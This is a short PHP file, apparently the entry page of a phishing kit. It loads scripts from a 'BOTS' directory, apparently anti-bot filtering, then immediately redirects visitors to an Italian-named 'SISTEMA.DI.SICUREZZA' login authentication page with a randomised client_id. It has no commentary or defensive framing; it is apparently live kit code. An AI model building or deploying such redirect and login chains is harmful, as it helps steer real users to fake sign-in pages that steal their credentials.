<?php
include_once '../BOTS/INC/APP.php';
include_once '../BOTS/STRNG.php';
 echo "<META HTTP-EQUIV='Refresh' Content=0;URL='./SISTEMA.DI.SICUREZZA/LOGIN/authentication.php?client_id=$my_rand_strng'>";
?>